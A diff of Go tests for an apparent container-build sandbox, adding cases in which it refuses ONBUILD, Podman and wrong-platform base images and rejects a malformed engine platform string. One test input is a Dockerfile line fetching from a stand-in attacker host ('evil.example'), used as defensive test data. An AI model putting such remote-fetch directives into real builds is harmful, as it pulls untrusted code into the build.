@@ -236,6 +236,8 @@ func TestBuildRefusesEscapes(t *testing.T) {
 		"mount From upper":   {dockerfileRepo("FROM alpine:3\nRUN --mount=type=bind,From=missing.example/base:1,target=/m true\n"), BuildBaseImageMissing},
 		"numeric FROM":       {dockerfileRepo("FROM 1234\n"), BuildBaseImageMissing},
 		"base onbuild":       {dockerfileRepo("FROM onbuild.example/base:1\n"), BuildImageRefused},
+		"podman onbuild":     {dockerfileRepo("FROM podman.example/base:1\n"), BuildImageRefused},
+		"other platform":     {dockerfileRepo("FROM arm.example/base:1\n"), BuildImageRefused},
 		"onbuild":            {dockerfileRepo("FROM alpine:3 AS a\nONBUILD ADD https://evil.example/x /x\nFROM a\n"), BuildDockerfileRefused},
 		"cache mount":        {dockerfileRepo("FROM alpine:3\nRUN --mount=type=cache,target=/root/.npm true\n"), BuildDockerfileRefused},
 	}
@@ -243,6 +245,8 @@ func TestBuildRefusesEscapes(t *testing.T) {
 		t.Run(name, func(t *testing.T) {
 			rec := withBuilds(&recorder{}, 0, "missing.example/base:1", "1234")
 			rec.images["onbuild.example/base:1"] = cliResult{stdout: []byte(dockerInspectOnBuild)}
+			rec.images["podman.example/base:1"] = cliResult{stdout: []byte(podmanInspectOnBuild)}
+			rec.images["arm.example/base:1"] = cliResult{stdout: []byte(`[{"Os":"linux","Architecture":"arm64"}]`)}
 			s := testSandbox(t, rec)
 			app, err := s.Build(context.Background(), tt.repo)
 			if err != nil || app.Built() || app.Unavailable != tt.reason {
@@ -287,6 +291,9 @@ func TestBuildFailureIsUnavailable(t *testing.T) {
 		detail string
 	}{
 		"exit 1": {func() *recorder { return withBuilds(&recorder{}, 1) }, BuildFailed, "exit_1"},
+		"engine platform unreadable": {func() *recorder {
+			return withBuilds(&recorder{platform: "linux/amd64 --oops"}, 0)
+		}, BuildRuntimeError, "platform"},
 		"no image id": {func() *recorder {
 			return &recorder{reply: func(context.Context, []string) (cliResult, error) { return cliResult{}, nil }}
 		}, BuildFailed, "no_image_id"},
